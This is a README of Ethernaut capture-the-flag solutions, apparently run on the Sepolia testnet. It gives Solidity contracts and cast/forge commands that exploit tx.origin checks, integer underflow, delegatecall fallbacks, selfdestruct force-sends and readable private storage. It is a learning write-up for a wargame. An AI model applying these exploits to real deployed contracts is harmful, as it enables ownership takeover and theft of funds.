# Ethernaut-ctf-solutions

i'm using sepolia testnet for the transactions, u can choose testnet accordingly. All the instance code is in instances folder.

## level00 - Hello Ethernaut

1. As we can see all the functions are directing us to authenticate() fun. where we need to
   enter password.
2. we can get the password from console
   ```console
   await contract.password()
   ```
3. then we can either use console
   ```console
   await contract.authenticate("ethernaut0")
   ```
   or run our script file level00.s.sol
   ```terminal
   forge script ./script/level00.s.sol broadcast -vvvv --rpc-url $RPC_URL --private-key $PKEY
   ```
4. submit the instance, u're done

## level01 - Fallback

1. our main goal here is to be the owner and drain the contract balance, we can do this by two ways
   1. either keep contributing using contribute() to make your contribution
      more then the current owner and use withdraw() which is not a feasible
      solution obvi.
   2. or we can use the receive() fun. where we need to fulfill two basic conditions, msg.value>0 and contibutions[msg.sender]>0 , which is
      comparatively easy, then use withdraw(), so proceeding with this option
2. first we can use contribute() fun. to send some wei then use low level call
   function to make our msg.value>0
3. As both condition satisfies, we'll be the owner , now all we need to do is
   use withdraw() to get all the funds out.
4. checkout level01.s.sol for the code, run the script file on testnet
   ```terminal
   forge script ./script/level01.s.sol broadcast -vvvv --rpc-url $RPC_URL --private-key $PKEY
   ```
5. submit the instance , u're done

## level02 - Fallout

1. same as previous one we need to get the ownership here
2. we can achieve that by simply calling Fal1out() either from the console
   ```console
   await contract.Fal1out()
   ```
   or using script file level02.s.sol
3. submit the instance, u're done.

## level04 - Telephone

1. goal is to claim ownership but there's a condition, tx.origin !=
   msg.sender
2. tx.origin always refers to the original sender (or the EOA), while msg.sender refers to the sender of the current message (or call) in the context of the contract
3. to do this, we'll use a proxy contract with source code:

   ```solidity
   // SPDX-License-Identifier: MIT
   pragma solidity ^0.8.0;
   import "../instances/Ilevel04.sol";

   contract Tele {
       Telephone level4 = Telephone(0x3d3F549676B9812D256F63C96b4b80FE06522736);
       function exploit() external {
           level4.changeOwner(0xB63bF09362065C621E3552D646F938662911f33a);
       }
   }
   ```

4. deploy our contract
   ```terminal
   forge create Tele --rpc-url $RPC_URL --private-key $PKEY
   ```
5. call the exploit function
   ```terminal
   cast call $DEPLOYED_ADDRESS "exploit()" --rpc-url $RPC_URL --private-key $PKEY
   ```
   here the tx.origin will be our address and msg.sender will be the address of contract we deployed rn
6. after being the owner, submit instance, u're done.

## level05 - Token

1. the goal here is to get our hands on any additional token
2. vulnerability lies here in the 2nd line of transfer function where it is
   deducting msg.sender's balance, as this contract uses older version of
   solidity it is prone to underflow/overflow.
3. so the hack is we'll cause an underflow by sending 21 tokens which will make
   balance[msg.sender] = 20 - 21 = max limit for uint256, and increase it by a large value
4. we can do this by calling transfer function either thru cast send command
   ```terminal
   cast send $LEVEL_ADDRESS "transfer(address _to, uint256 _value)" 0xb364AC25023f1859df404e4AE9aeC80Ab425b0C7 21 --rpc-url $RPC_URL --private-key $PKEY
   ```
   or using our script file level05.s.sol
   ```terminal
   forge script ./script/level05.s.sol broadcast -vvvv --rpc-url $RPC_URL --private-key $PKEY
   ```
5. submit the instance, u're done.

## level06 - Delegation

1. our goal here is to claim ownership of the given instance which we can do
   using pwn() fun.
2. We need to trigger the fallback function in the Delegation contract to invoke the pwn() function via msg.data which will then make a delegate
   call to pwn() and make msg.sender the owner.
3. to do this first we need to get methodId of pwn()
   ```terminal
   cast calldata "pwn()"
   ```
   then call the fallback fun.
   ```terminal
   cast send $LEVEL_ADDRESS 0xdd365b8b --gas-limit 50000 --rpc-url $RPC_URL --private-key $PKEY
   // we need to set a custom gas limit for this transaction as the default amount insufficient
   ```
4. send the transaction, submit instance, u're done

## level07 - Force

1. here we need to increase the balance of our contract, but neither it has any recieve() or fallback() fun. , so what we gonna use is selfdestruct()
2. preferably use remix, as new versions of solidity doesn't support selfdestruct(), source code:
   ```solidity
   // SPDX-License-Identifier: MIT
   pragma solidity ^0.6.0;

   contract Forced{
       constructor () public payable {
           selfdestruct(0x2BA0bf631A0c17C516D74634E24fCA5Fff21575f); //level add.
       }
   }
   ```
3. we'll send some eth at deployment time to increase contract balance and cuz of selfdestruct all this will go to Force contract
4. we're using selfdestruct() in constructor itself, so it can operate at deployment time and we don't need to call any other function
5. submit the instance after deployment, u're done.

## level08 - Vault

1. Nothing on the blockchain is considered to be private, not even private variables. Acc. to the contract
1. storage slot 0 = locked
1. storage slot 1 = password
1. So we can easily get the value of password by inspecting storage slot 1

```terminal
cast storage $LEVEL_ADDRESS 1 --rpc-url $RPC_URL
```

3. Now pass the extracted password to unlock function

```
cast send $LEVEL_ADDRESS "unlock(bytes32 _password)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --rpc-url $RPC_URL --private-key $PKEY
```

4. submit the instance, u're done
